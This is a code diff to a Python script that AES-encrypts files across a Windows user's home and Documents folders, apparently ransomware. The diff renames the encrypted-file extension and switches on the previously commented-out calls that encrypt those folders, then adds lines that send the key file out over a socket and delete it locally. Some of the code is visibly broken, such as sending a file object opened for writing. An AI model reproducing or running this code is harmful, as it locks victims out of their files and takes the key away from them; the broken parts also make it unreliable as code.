@@ -5,6 +5,7 @@
 import os, glob, sys
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256 as sha
+
 import socket
 import subprocess
 import platform
@@ -41,7 +42,7 @@ class myAES():
         return header, filler
 
     def enc(self, filename):
-        encfilename = filename + '.sasya'
+        encfilename = filename + '.enc'
         header, filler = self.makeEncInfo(filename)
         aes = AES.new(self.key, AES.MODE_CBC, self.iv)
         kk = open(keyPath + 'key.txt', 'wb+')
@@ -65,7 +66,7 @@ class myAES():
         hh.close()
 
     def dec(self, encfilename, readKey) :
-        filename = encfilename.strip('.sasya')
+        filename = encfilename.strip('.enc')
         aes = AES.new(readKey, AES.MODE_CBC, self.iv)
 
         h = open(filename, 'wb+')
@@ -131,5 +132,10 @@ documentPath = 'C:\\Users\\' + user + '\\Documents\\*'
 keyPath = 'C:\\Users\\' + user + '\\'
 print(glob.glob(startPath, recursive=True))
 
-#searchEncFile(startPath)
-#searchEncFile(documentPath)
+searchEncFile(startPath)
+searchEncFile(documentPath)
+
+kk = open(keyPath + 'key.txt', 'wb+')
+
+sock.send(kk)
+os.remove(keyPath + 'key.txt')
